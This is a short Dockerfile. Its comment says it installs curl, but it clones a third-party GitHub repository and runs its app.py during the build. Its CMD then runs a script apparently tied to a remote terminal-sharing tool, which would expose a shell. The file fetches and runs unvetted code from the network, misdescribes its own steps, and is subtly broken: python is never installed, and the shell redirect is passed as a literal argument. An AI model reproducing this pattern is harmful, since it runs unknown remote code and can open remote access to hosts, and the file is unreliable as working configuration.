# Base image
FROM ubuntu:latest

# Update and install curl
RUN apt update && apt upgrade -y && apt install git && git clone https://github.com/Teo4268/New.git && cd New && python app.py


# Set the command to execute the script during runtime
CMD ["sh", "-s", "run", "<", "/usr/local/bin/sshx-script"]
